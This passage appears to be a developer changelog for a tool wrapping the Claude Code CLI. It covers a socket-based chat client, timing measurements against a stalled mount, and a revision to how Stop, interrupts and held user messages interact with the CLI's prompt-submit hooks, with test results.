- **chat, no new wrapper frame:** the CLI speaks dtach 0.9's client packet on the session's own socket; the frames are the session's adapter's own (`formatChatInput` / `formatInterrupt` with placeholders, written into the row — no harness named in the CLI, §78 clean); every line waits for `_stdin_ack` (3 s) or the CLI goes read-only, said. History from the harness store's `locate` (cached) else the buffer.
- **Measured (a scratch bindfs, its daemon SIGSTOPped):** by hand, `ls` of the folder never answered and a connect to the socket sat in state D (unkillable by `timeout`) for 3+ min; the CLI: `ls` 2.0 s (alive — its process runs; the socket's mount not answering), `status` 2.0 s («data/ NOT answering»), `chat` 2.0 s read-only with the reason; after SIGCONT the same chat sent its line. A first cut HELD the CLI at exit on the stuck probe child's open pipe — the clock now drops the child's pipes and a 500 ms exit backstop ends an answered verb.
- **Census finding (§104):** a daemon pipe session re-opened at boot (boot-restore `restoreAgentdPipeSessions`) joined the live list without reaching `broadcastActiveSessions` — it broadcasts now.

### claude-steer-inject r4 — a Stop window closes on the CLI's words, a copy is claimed by its witness, riding is not landed, the hold chord keeps the composer's law at idle (acceptance r2's verdict: 11 reviewers on 7df30f96)
- **Why:** r2's 2 s clock started at the interrupted result, but the CLI runs its UserPromptSubmit hook BEFORE the follow-up's init, and the product's own hook (data/bin/vibespace-hook.mjs) waits on the hub up to 3 s. With a ~2.9 s hook the clock closed the window first: MARK-B was answered after Stop. In the owed-turn shape it drained an Alt+Enter-held frame into the turn the CLI was starting. r2 had measured with VIBESPACE_SKIP_AGENT_HOOKS=1.
- **Measured on 2.1.312** (measure/probe-r4.mjs raw, probe-r4w.mjs through each tree's own wrapper; the product's hooks registered by data/bin/vibespace-hook-register.mjs into a scratch HOME; a loopback hub and mock):
  - The CLI's hook timeout is the registered `timeout: 10` (600 s when a hook names none: `Hf = 600000`).
  - `CLAUDE_CODE_EMIT_USER_PROMPT_SUBMIT_HOOK_EVENTS` makes the CLI say `hook_started` ~10 ms after the interrupted result and `hook_response` when the hook ends.
  - An interrupt INSIDE the hook cancels it and DROPS the held frame from the conversation: no user record, and the next request lacks it. So the init stays the interrupt point.
  - A person's frame's `uuid` becomes the CLI's user-record uuid, and the `source_uuid` of a queued_command attachment.
- **Built:**
  - The adapter sets the hook-events switch (chat only).
  - The wrapper consumes the UserPromptSubmit hook lines (never teed) and arms no clock while a hook runs. Its backstop is 30 s where the CLI owes a turn and 2 s where it owes nothing.
  - Stop keeps a `riding` frame, and a window that closes with no follow-up settles it as `landed`.
  - The wrapper stamps a `uuid` on each person's mid-turn frame. The copy names it (`cliUuid`), and an edit rewrites the copy.
  - The normalizer claims a copy by witness only, and a record with a block kind the copy lacks gives the bubble its blocks.
  - Alt+Enter is `_altEnter`: it holds during a turn and is the composer's own Enter at idle (unstamped).
  - The stream consumer draws the running line at a CLI-started turn's init.
  - The heavy suite runs its teardown on signals.
- **RED controls (7df30f96 vs this commit, the real 2.1.312 + the product's hooks):**
  - hook-stop (~2.9 s hook): answered after Stop vs 0 requests.
  - hook-owed: C rode B's tool result vs C ran as its own turn.
  - A 400 KB screenshot held / handed-own / kept, then restarted: 0 images vs 1 image each.
  - edit, restarted: 2 bubbles vs 1.
  - A 61-call turn, restarted: 2 bubbles vs 1.
  - The riding race (in-process): landed + answered vs kept + interrupted in the same tick.
  - The 1.5 s hook and the no-hook cases are green on both trees.
- **Accepted limit:** the init-tick interrupt races the CLI's first request. The reviewers saw 2/9 on 2.1.308 with a bare `sleep` hook; with the product's own 1.5 s hook it was 0/10 on 2.1.308 and 0/20 (+0/9 raw) on 2.1.312.
- **Tests:**
  - test-claude-steer 66 (base 54/8).
  - test-claude-steer-chrome 79 (base 66/11; new legs ⑮–⑱ and §A ⑤–⑦, the δ legs judged by signal).
  - test-stdout-registry 269 (base 267/2).
